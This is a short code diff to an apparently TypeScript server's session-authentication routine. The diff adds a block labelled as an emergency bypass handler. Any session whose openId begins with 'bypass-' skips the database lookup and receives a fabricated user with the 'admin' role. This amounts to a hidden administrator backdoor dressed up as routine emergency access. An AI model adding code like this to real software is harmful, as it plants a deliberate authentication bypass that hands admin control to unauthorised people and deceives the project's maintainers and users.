@@ -268,6 +268,23 @@ class SDKServer {
     }
 
     const sessionUserId = session.openId;
+
+    // --- EMERGENCY BYPASS HANDLER ---
+    if (sessionUserId.startsWith("bypass-")) {
+      return {
+        id: 999999,
+        openId: sessionUserId,
+        name: session.name || "Usuario de Emergencia",
+        email: "emergency@bypass.local",
+        role: "admin", // Admin privileges for emergency access
+        loginMethod: "bypass",
+        createdAt: new Date(),
+        updatedAt: new Date(),
+        lastSignedIn: new Date(),
+      } as User;
+    }
+    // --------------------------------
+
     const signedInAt = new Date();
     let user = await db.getUserByOpenId(sessionUserId);
 
